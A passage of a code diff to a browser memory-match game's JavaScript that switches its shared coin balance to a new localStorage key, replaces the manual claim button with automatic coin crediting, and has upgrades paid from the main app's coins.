+                GameState.baseMultiplier = 1 + (GameState.actualLevel * 0.05);
+                saveGameData();
+                showToast(`Level ${GameState.actualLevel} Unlocked!`, 'success');
+                updateUI();
+                createConfetti();
+            }
         }
 
         function showLevelUpOverlay() {
@@ -2645,7 +2438,7 @@
             clearInterval(progressInterval);
             clearVerificationProgress();
             
-            // CRITICAL: Now update actualLevel to match displayLevel
+            // Update actualLevel to match displayLevel
             if (GameState.pendingLevel) {
                 GameState.actualLevel = GameState.pendingLevel;
                 GameState.displayLevel = GameState.actualLevel;
@@ -2720,11 +2513,10 @@
             container.innerHTML = upgrades.map(up => {
                 const data = GameState.upgrades[up.id];
                 const isMaxed = data.level >= data.maxLevel;
-                const canAfford = GameState.currentScore >= data.cost;
                 
                 return `
-                    <div class="upgrade-card ${isMaxed ? 'maxed' : ''} ${!canAfford && !isMaxed ? 'disabled' : ''}" 
-                         onclick="${!isMaxed && canAfford ? `buyUpgrade('${up.id}')` : ''}">
+                    <div class="upgrade-card ${isMaxed ? 'maxed' : ''}" 
+                         onclick="${!isMaxed ? `buyUpgrade('${up.id}')` : ''}">
                         <div class="upgrade-icon" style="background: ${up.color};">
                             <i class="fas ${up.icon}"></i>
                         </div>
@@ -2742,16 +2534,27 @@
 
         function buyUpgrade(type) {
             const upgrade = GameState.upgrades[type];
-            if (GameState.currentScore < upgrade.cost || upgrade.level >= upgrade.maxLevel) return;
             
-            GameState.currentScore -= upgrade.cost;
+            // Get Silly Prize coins
+            const sillyPrizeData = JSON.parse(localStorage.getItem('sillyPrize_v9') || '{}');
+            const currentCoins = sillyPrizeData.coins || 0;
+            
+            if (currentCoins < upgrade.cost || upgrade.level >= upgrade.maxLevel) {
+                showToast('Not enough coins in main balance!', 'error');
+                return;
+            }
+            
+            // Deduct from Silly Prize
+            sillyPrizeData.coins = currentCoins - upgrade.cost;
+            localStorage.setItem('sillyPrize_v9', JSON.stringify(sillyPrizeData));
+            
             upgrade.level++;
             upgrade.cost = Math.floor(upgrade.baseCost * Math.pow(1.8, upgrade.level));
             
             applyUpgradeEffects();
             renderUpgrades();
             updateUI();
-            saveGameData();
+            loadMainAppData(); // Refresh display
             updatePreviewStats();
             
             showToast(`Upgraded ${type}!`, 'success');
@@ -2762,7 +2565,7 @@
         }
 
         function updateUI() {
-            // CRITICAL: Show displayLevel (the level they achieved, even if pending)
+            // Show displayLevel
             document.getElementById('levelValue').textContent = GameState.displayLevel;
             document.getElementById('currentXp').textContent = GameState.xp;
             document.getElementById('targetXp').textContent = GameState.xpToNext === 0 ? 'MAX' : GameState.xpToNext.toLocaleString();
@@ -2797,27 +2600,69 @@
             const totalMult = (GameState.scoreMultiplier * GameState.baseMultiplier).toFixed(1);
             document.getElementById('multiplierText').textContent = `x${totalMult}`;
             
-            const claimBtn = document.getElementById('claimBtn');
-            const claimAmount = document.getElementById('claimAmount');
-            claimAmount.textContent = Math.floor(GameState.currentScore).toLocaleString();
-            
-            if (!GameState.gameEnded) {
-                claimBtn.disabled = GameState.currentScore < 50 || GameState.isLocked || GameState.gameActive;
-            }
-            
-            document.getElementById('sessionEarnings').textContent = Math.floor(GameState.totalEarned).toLocaleString();
+            document.getElementById('sessionEarnings').textContent = Math.floor(GameState.currentScore).toLocaleString();
         }
 
         function loadMainAppData() {
             try {
-                const saved = localStorage.getItem('gameCoinPro_v4');
+                const saved = localStorage.getItem('sillyPrize_v9');
                 if (saved) {
                     const data = JSON.parse(saved);
-                    GameState.mainAppCoins = data.coins || 0;
-                    document.getElementById('mainBalance').textContent = GameState.mainAppCoins.toLocaleString();
+                    document.getElementById('mainBalance').textContent = (data.coins || 0).toLocaleString();
                 }
             } catch (e) {
                 console.error('Error loading main app data:', e);
+            }
+        }
+
+        // CRITICAL: Auto-add coins to Silly Prize (no claim button)
+        function addCoinsToMainApp(amount) {
+            try {
+                const saved = localStorage.getItem('sillyPrize_v9');
+                if (saved) {
+                    const data = JSON.parse(saved);
+                    data.coins = (data.coins || 0) + Math.floor(amount);
+                    data.gamesCoins = (data.gamesCoins || 0) + Math.floor(amount);
+                    data.gamesPlayed = (data.gamesPlayed || 0) + 1;
+                    data.todayEarned = (data.todayEarned || 0) + Math.floor(amount);
+                    data.totalEarned = (data.totalEarned || 0) + Math.floor(amount);
+                    
+                    const historyItem = {
+                        id: Date.now(),
+                        amount: Math.floor(amount),
+                        source: 'memory',
+                        sourceId: 'memory',
+                        isNegative: false,
+                        timestamp: new Date().toISOString()
+                    };
+                    data.history = data.history || [];
+                    data.history.unshift(historyItem);
+                    if (data.history.length > 100) data.history.pop();
+                    
+                    // Update task progress if exists
+                    if (!data.completedTasks) data.completedTasks = {};
+                    if (!data.readyTasks) data.readyTasks = {};
+                    
+                    // Mark game task as ready if applicable
+                    if (!data.completedTasks['play_game_1'] && !data.readyTasks['play_game_1']) {
+                        data.readyTasks['play_game_1'] = true;
+                    }
+                    
+                    localStorage.setItem('sillyPrize_v9', JSON.stringify(data));
+                    
+                    // Also notify parent window if in iframe
+                    if (window.opener) {
+                        window.opener.postMessage({
+                            type: 'GAME_REWARD',
+                            gameId: 'memory',
+                            coins: Math.floor(amount)
+                        }, '*');
+                    }
+                    
+                    loadMainAppData();
+                }
+            } catch (e) {
+                console.error('Error saving to main app:', e);
             }
         }
 
@@ -2827,14 +2672,10 @@
                 if (saved) {
                     const data = JSON.parse(saved);
                     
-                    // Restore all game state
                     GameState.totalGamesPlayed = data.totalGamesPlayed || 0;
                     GameState.totalGamesWon = data.totalGamesWon || 0;
-                    
-                    // CRITICAL: Restore both levels
                     GameState.displayLevel = data.displayLevel || data.level || 1;
                     GameState.actualLevel = data.actualLevel || data.level || 1;
-                    
                     GameState.xp = data.xp || 0;
                     GameState.xpToNext = XP_TABLE[GameState.actualLevel - 1] || 100;
                     GameState.matches = data.matches || 0;
@@ -2845,10 +2686,7 @@
                     GameState.isLocked = data.isLocked || false;
                     GameState.pendingLevel = data.pendingLevel || null;
                     GameState.gameEnded = data.gameEnded || false;
-                    GameState.canRestart = data.canRestart || false;
                     GameState.claimed = data.claimed || false;
-                    
-                    // Restore UI state
                     GameState.currentScreen = data.currentScreen || 'preview';
                     
                     applyUpgradeEffects();
@@ -2861,31 +2699,21 @@
         function saveGameData() {
             try {
                 const data = {
-                    // Game progress
                     totalGamesPlayed: GameState.totalGamesPlayed,
                     totalGamesWon: GameState.totalGamesWon,
-                    
-                    // CRITICAL: Save both levels
                     displayLevel: GameState.displayLevel,
                     actualLevel: GameState.actualLevel,
-                    
                     xp: GameState.xp,
                     matches: GameState.matches,
                     totalEarned: GameState.totalEarned,
                     currentScore: GameState.currentScore,
                     upgrades: GameState.upgrades,
-                    
-                    // State flags
                     verified: GameState.verified,
                     isLocked: GameState.isLocked,
                     pendingLevel: GameState.pendingLevel,
                     gameEnded: GameState.gameEnded,
-                    canRestart: GameState.canRestart,
                     claimed: GameState.claimed,
-                    
-                    // UI State
                     currentScreen: GameState.currentScreen,
-                    
                     lastSave: Date.now()
                 };
                 localStorage.setItem('memoryMatch_v6_save', JSON.stringify(data));
@@ -2910,72 +2738,6 @@
 
         function clearVerificationProgress() {
             localStorage.removeItem('memoryMatch_verification_progress');
-        }
-
-        function claimEarnings() {
-            if (GameState.canRestart) {
-                attemptRestart();
-                return;
-            }
-            
-            if (GameState.currentScore < 50 || GameState.claimed || GameState.isLocked) return;
-            
-            const amount = Math.floor(GameState.currentScore);
-            
-            // Send to parent window if exists
-            if (window.opener) {
-                window.opener.postMessage({
-                    type: 'GAME_REWARD',
-                    gameId: 'memory',
-                    coins: amount
-                }, '*');
-            }
-            
-            // Save to main app
-            try {
-                const saved = localStorage.getItem('gameCoinPro_v4');
-                if (saved) {
-                    const data = JSON.parse(saved);
-                    data.coins = (data.coins || 0) + amount;
-                    data.gamesPlayed = (data.gamesPlayed || 0) + 1;
-                    data.todayEarned = (data.todayEarned || 0) + amount;
-                    data.totalEarned = (data.totalEarned || 0) + amount;
-                    
-                    const historyItem = {
-                        id: Date.now(),
-                        amount: amount,
-                        source: 'memory',
-                        sourceId: 'memory',
-                        isNegative: false,
-                        timestamp: new Date().toISOString()
-                    };
-                    data.history = data.history || [];
-                    data.history.unshift(historyItem);
-                    if (data.history.length > 100) data.history.pop();
-                    
-                    localStorage.setItem('gameCoinPro_v4', JSON.stringify(data));
-                }
-            } catch (e) {
-                console.error('Error saving to main app:', e);
-            }
-            
-            GameState.claimed = true;
-            GameState.currentScore = 0;
-            
-            saveGameData();
-            updateUI();
-            loadMainAppData();
-            
-            showToast(`Claimed ${amount} coins!`, 'success');
-            
-            const btn = document.getElementById('claimBtn');
-            btn.innerHTML = '<i class="fas fa-check"></i> Claimed!';
-            btn.disabled = true;
-            btn.style.background = 'var(--gray)';
-            
-            setTimeout(() => {
-                goBack();
-            }, 2000);
         }
 
         function createConfetti() {
@@ -3022,7 +2784,6 @@
             }, 3000);
         }
 
-        // Auto-save on visibility change
         document.addEventListener('visibilitychange', () => {
             if (document.hidden) {
                 saveGameData();
@@ -3032,7 +2793,6 @@
             }
         });
 
-        // Save before unload
         window.addEventListener('beforeunload', () => {
             saveGameData();
             if (GameState.isVerifying) {
@@ -3040,7 +2800,6 @@
             }
         });
 
-        // Periodic auto-save every 5 seconds
         setInterval(() => {
             saveGameData();
         }, 5000);
